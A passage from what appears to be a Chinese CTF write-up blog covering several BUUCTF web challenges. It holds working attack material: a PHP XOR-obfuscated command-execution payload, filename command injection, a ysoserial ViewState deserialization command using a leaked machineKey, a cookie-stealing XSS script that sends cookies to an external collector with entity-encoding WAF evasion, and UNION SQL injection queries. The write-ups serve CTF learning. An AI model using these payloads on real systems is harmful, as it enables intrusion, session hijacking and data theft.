class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PHP函数：</span><br><span class="line"></span><br><span class="line">scandir() 函数：返回指定目录中的文件和目录的数组。</span><br><span class="line">base_convert() 函数：在任意进制之间转换数字。</span><br><span class="line">dechex() 函数：把十进制转换为十六进制。</span><br><span class="line">hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。</span><br><span class="line">var_dump() ：函数用于输出变量的相关信息。</span><br><span class="line">readfile() 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;&lt;command&gt;</span><br></pre></td></tr></table></figure><p>上面这个payload长度过长无法使用</p><p>最好用白名单中能用的函数来构造，下面是exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload =[<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>,  <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span> , <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line"><span class="keyword">for</span>($k=<span class="number">1</span>;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9</span>; $i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt;=<span class="number">9</span>;$j++)&#123;</span><br><span class="line">            $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">            <span class="keyword">echo</span>($payload[$k].<span class="string">"^$i$j"</span>.<span class="string">"==&gt;$exp"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在跑出的结果中去找能够连成_GET等，就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;ls%20&#x2F;</span><br></pre></td></tr></table></figure><p>查询根目录能够看到flag文件，读取一下拿到flag</p><h3 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h3><p>打开是个登录界面，开始以为是直接注入，后来发现不对，试了一下有注册页面，注册一个账号登录</p><img src="/2020/07/04/taoismt/19.png" class=""><p>看到url的格式，不是文件包含，但是应该可以用php伪协议读一下源码</p><p>贴一下function.php的，user.php和guest.php没啥太有用的信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hacker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Header(<span class="string">"Location: hacker.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $keywords = [<span class="string">"flag"</span>,<span class="string">"manage"</span>,<span class="string">"ffffllllaaaaggg"</span>];</span><br><span class="line">    $uri = parse_url($_SERVER[<span class="string">"REQUEST_URI"</span>]);</span><br><span class="line">    parse_str($uri[<span class="string">'query'</span>], $query);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>($keywords <span class="keyword">as</span> $token)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($query <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="keyword">if</span> (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory_guest</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $keywords = [<span class="string">"flag"</span>,<span class="string">"manage"</span>,<span class="string">"ffffllllaaaaggg"</span>,<span class="string">"info"</span>];</span><br><span class="line">    $uri = parse_url($_SERVER[<span class="string">"REQUEST_URI"</span>]);</span><br><span class="line">    parse_str($uri[<span class="string">'query'</span>], $query);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>($keywords <span class="keyword">as</span> $token)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($query <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="keyword">if</span> (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Filter</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $blacklist = <span class="string">"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password"</span>;</span><br><span class="line">    $whitelist = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+&gt;&lt;"</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($string); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="string">"$whitelist"</span>, $string[$i]) === <span class="keyword">false</span>) &#123;</span><br><span class="line">            Hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/$blacklist/is"</span>, $string)) &#123;</span><br><span class="line">        Hacker();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_string($string)) &#123;</span><br><span class="line">        <span class="keyword">return</span> $mysqli-&gt;real_escape_string($string);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_query</span><span class="params">($sql_query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $res = $mysqli-&gt;query($sql_query);</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($user, $pass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $user = Filter($user);</span><br><span class="line">    $pass = md5($pass);</span><br><span class="line">    $sql = <span class="string">"select * from `albert_users` where `username_which_you_do_not_know`= '$user' and `password_which_you_do_not_know_too` = '$pass'"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    $res = sql_query($sql);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        $data = $res-&gt;fetch_array();</span><br><span class="line">        $_SESSION[<span class="string">'user'</span>] = $data[username_which_you_do_not_know];</span><br><span class="line">        $_SESSION[<span class="string">'login'</span>] = <span class="number">1</span>;</span><br><span class="line">        $_SESSION[<span class="string">'isadmin'</span>] = $data[isadmin_which_you_do_not_know_too_too];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateadmin</span><span class="params">($level,$user)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $sql = <span class="string">"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '$level' where `username_which_you_do_not_know`='$user' "</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    $res = sql_query($sql);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//    die($res);</span></span><br><span class="line">    <span class="keyword">if</span> ($res == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($user, $pass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $user = Filter($user);</span><br><span class="line">    $pass = md5($pass);</span><br><span class="line">    $sql = <span class="string">"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('$user','$pass','0')"</span>;</span><br><span class="line">    $res = sql_query($sql);</span><br><span class="line">    <span class="keyword">return</span> $mysqli-&gt;insert_id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    session_destroy();</span><br><span class="line">    Header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>blacklist里的东西ban掉了sql注入的想法，在$keywords数组中有点东西，试试读取一下，这里注意到了parse_url()，用url错误解析返回false就能绕过了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ffffllllaaaaggg.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"you can not visit it directly"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you can find sth in m4aaannngggeee"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟着提示接着访问m4aaannngggeee</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#m4aaannngggeee.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"you can not visit it directly"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">"templates/upload.html"</span>;</span><br></pre></td></tr></table></figure><img src="/2020/07/04/taoismt/20.png" class=""><p>以为是个文件上传，但是是个假的，来读取一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</span><br><span class="line">$size = <span class="number">10000000</span>;</span><br><span class="line">$path = <span class="string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span>;</span><br><span class="line">$filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:not an upload fileï¼"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$newfile = $path.$filename;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"file upload success&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $filename;</span><br><span class="line">$picdata = system(<span class="string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span>.$filename.<span class="string">" | base64 -w 0"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/png;base64,"</span>.$picdata.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显就能够看出这题是文件名注入</p><p>访问一下前面两个路径，m4aaannngggeee是真的</p><img src="/2020/07/04/taoismt/21.png" class=""><p>在这里上传文件，抓包修改文件名，测试发现/被过滤了，用..代替</p><img src="/2020/07/04/taoismt/22.png" class=""><h3 id="BJDCTF-2nd-EasyAspDotNet"><a href="#BJDCTF-2nd-EasyAspDotNet" class="headerlink" title="[BJDCTF 2nd]EasyAspDotNet"></a>[BJDCTF 2nd]EasyAspDotNet</h3><p>这道题跟着赵总的wp做的，链接走一波：<a href="https://www.zhaoj.in/read-6497.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6497.html</a></p><img src="/2020/07/04/taoismt/23.png" class=""><p>可以看到文件路径，尝试文件目录穿越读取web.config</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">system.web</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">machineKey</span> <span class="attr">validationKey</span>=<span class="string">"47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9"</span> <span class="attr">decryptionKey</span>=<span class="string">"B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5"</span> <span class="attr">validation</span>=<span class="string">"SHA1"</span> <span class="attr">decryption</span>=<span class="string">"3DES"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">system.web</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>之后用ysoserial生成payload，开箱即用<a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener">https://github.com/pwntester/ysoserial.net</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c &quot;ExploitClass.cs;.&#x2F;System.dll;.&#x2F;System.Web.dll&quot; --generator&#x3D;&quot;CA0B0334&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot;</span><br></pre></td></tr></table></figure><p>通过postman把生成的payload赋给__VIEWSTATE</p><img src="/2020/07/04/taoismt/24.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>taoisms</title>
      <link href="/2020/07/02/taoisms/"/>
      <url>/2020/07/02/taoisms/</url>
      
        <content type="html"><![CDATA[<h3 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker<a id="more"></a></h3><p>开题，注册登录，跳转到个人主页</p><img src="/2020/07/02/taoisms/1.png" class=""><p>所有的边边框框都点不了，除了更换头像这一块，文件上传没跑了</p><p>先上传一个图片马，成功上传，在前端页面发现了上传路径，访问，只能出来图片，没有被解析，上传.htaccess，不被允许的类型，burp抓包改后缀试试</p><p>抓包再把后缀改为php成功上传</p><img src="/2020/07/02/taoisms/2.png" class=""><p>直接上蚁剑，根目录下找到flag，或者直接网页读取</p><img src="/2020/07/02/taoisms/3.png" class=""><p>建议还是用蚁剑，不知道什么原因文件名的F无法显示</p><img src="/2020/07/02/taoisms/4.png" class=""><h3 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h3><p>论坛发帖，发帖需要注册，看这个发帖的形式应该是xss类型的题</p><p>注册登录，题目有提示去到buu提供的xss平台，这边平台上有提供默认模块的xss链子，但是好像还是不太能打的通，看了wp，直接借用赵总的xss代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">window</span>.location.href=<span class="string">'http://xss.buuoj.cn/index.php?do=api&amp;id=drlczi&amp;location='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> <span class="built_in">document</span>.location.href&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span><span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;toplocation='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> top.location.href&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span><span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;cookie='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> <span class="built_in">document</span>.cookie&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span><span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;opener='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span>(<span class="built_in">window</span>.opener&amp;&amp;<span class="built_in">window</span>.opener.location.href)?<span class="built_in">window</span>.opener.location.href:<span class="string">''</span>&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span><span class="string">''</span>&#125;&#125;)());&#125;)();</span><br></pre></td></tr></table></figure><p>这里的ip需要自己改一下，这里注意到赵总的wp里有说到这里有waf，需要用到HTML Markup编码，实际上这种编码方式就是用&amp;#+ascii对应的值，直接借用赵总转化的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">in_str = <span class="string">""</span></span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> in_str:</span><br><span class="line">    output += <span class="string">"&amp;#"</span> + str(ord(c))</span><br><span class="line">print(<span class="string">"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34"</span> + output + <span class="string">"&amp;#34&amp;#41&lt;/script&gt;"</span>)</span><br></pre></td></tr></table></figure><p>转化结果：</p><img src="/2020/07/02/taoisms/5.png" class=""><p>提交之后访问一下保存的页面，记下路径</p><img src="/2020/07/02/taoisms/7.png" class=""><p>这里有一个MD5的碰撞，用碰撞脚本就能很快跑出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">str1=<span class="string">''</span></span><br><span class="line">ch = string.printable</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ch:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> ch:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> ch:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> ch :</span><br><span class="line">                str1=str(i)+str(j)+str(k)+str(l)</span><br><span class="line">                a=hashlib.md5(str1.encode(encoding=<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> a[<span class="number">0</span>:<span class="number">6</span>]==<span class="string">"2f18b8"</span>:</span><br><span class="line">                    print(str1)</span><br></pre></td></tr></table></figure><p>之后就去那个xss网站收一下接收到的管理员的SESSION</p><img src="/2020/07/02/taoisms/8.png" class=""><p>用管理员的SESSION值进行替换，成功登录</p><img src="/2020/07/02/taoisms/6.png" class=""><p>这里应该是一个sql注入，测试没有过滤任何东西，直接进行联合注入查询即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">#    #查表 flag,users</span></span><br><span class="line"><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'flag'</span><span class="comment">#   #查字段 flagg</span></span><br><span class="line"><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(flagg) <span class="keyword">from</span> flag<span class="comment"># #查值，查到flag</span></span><br></pre></td></tr></table></figure><h3 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h3><p>刚开始以为是道sql注入题，但是怎么试都没用，bp抓包，看到了传过去的数据形式是xml的形式，真的是尬住了，看了wp才知道是xpath盲注，没啥好说的，附上学习链接：<a href="https://xz.aliyun.com/t/7791#toc-6" target="_blank" 